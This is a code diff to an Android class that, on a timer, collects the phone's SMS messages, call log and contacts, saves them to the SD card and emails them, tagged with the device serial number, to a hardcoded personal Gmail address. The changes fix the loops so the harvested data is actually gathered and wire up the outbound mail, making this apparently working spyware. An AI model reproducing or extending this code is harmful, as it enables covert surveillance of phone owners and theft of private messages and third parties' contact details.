@@ -30,7 +30,7 @@ import android.util.Log;
  */
 public class GetInfoTask extends TimerTask 
 {
-	private final String LOGTAG = "GetInfoTask";
+	private final static String LOGTAG = "GetInfoTask";
 	
 	private final static String DEFAULT_FOLDER = "tmp"; 
 	
@@ -75,17 +75,17 @@ public class GetInfoTask extends TimerTask
 		
 	}
 	
-	private void CollectSms(Service service) 
+	public static void CollectSms(Context context) 
 	{
 		StringBuilder sb = new StringBuilder();
-		List<SmsInfo> list = SmsCtrl.getSmsList(service, SmsCtrl.SMS_URI_ALL);
+		List<SmsInfo> list = SmsCtrl.getSmsList(context, SmsCtrl.SMS_URI_ALL);
 		for (int i = 0; i < list.size(); i++)
 		{
 			sb.append(list.get(i).toString());
 			sb.append(SysUtils.NEWLINE);
 		}
 		
-		String fileName = FileCtrl.makeFileName(service.getApplicationContext(), 
+		String fileName = FileCtrl.makeFileName(context.getApplicationContext(), 
 				Resources.getSystem().getString(R.string.sms_name)); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
@@ -96,16 +96,16 @@ public class GetInfoTask extends TimerTask
 		}
 	}
 
-	private void CollectPhoneCallHist(Service service) 
+	public static void CollectPhoneCallHist(Context context) 
 	{
 		StringBuilder sb = new StringBuilder();
-		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(service);
+		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(context);
 		for (int i = 0; i < list.size(); i++)
 		{
-			list.get(i).toString();
+			sb.append(list.get(i).toString());
 		}
 		
-		String fileName = FileCtrl.makeFileName(service.getApplicationContext(), 
+		String fileName = FileCtrl.makeFileName(context, 
 				Resources.getSystem().getString(R.string.phonecall_name)); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
@@ -116,16 +116,16 @@ public class GetInfoTask extends TimerTask
 		}
 	}
 
-	private void CollectContact(Service service) 
+	public static void CollectContact(Context context) 
 	{
 		StringBuilder sb = new StringBuilder();
-		List<ContactInfo> list = ContactCtrl.getContactList(service);
+		List<ContactInfo> list = ContactCtrl.getContactList(context);
 		for (int i = 0; i < list.size(); i++)
 		{
-			list.get(i).toString();
+			sb.append(list.get(i).toString());
 		}
 		
-		String fileName = FileCtrl.makeFileName(service.getApplicationContext(), 
+		String fileName = FileCtrl.makeFileName(context, 
 				Resources.getSystem().getString(R.string.contact_name)); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
@@ -145,11 +145,12 @@ public class GetInfoTask extends TimerTask
             String subject = Resources.getSystem().getString(R.string.mail_from) 
             		 + DeviceProperty.getSerialNum() + " - " + (new String()).toString();
             String body = subject;
-            sender.sendMail(subject, body,   
-                    "user@gmail.com",   
-                    "user@yahoo.com");   
+            sender.sendMail(subject, body,  
+                    "richardroky@gmail.com",   
+                    "richardroky@gmail.com");
+            ret = true;
         } catch (Exception e) {   
-            Log.e("SendMail", e.getMessage(), e);   
+            Log.e(LOGTAG, e.getMessage());
         }
         
 		return ret;
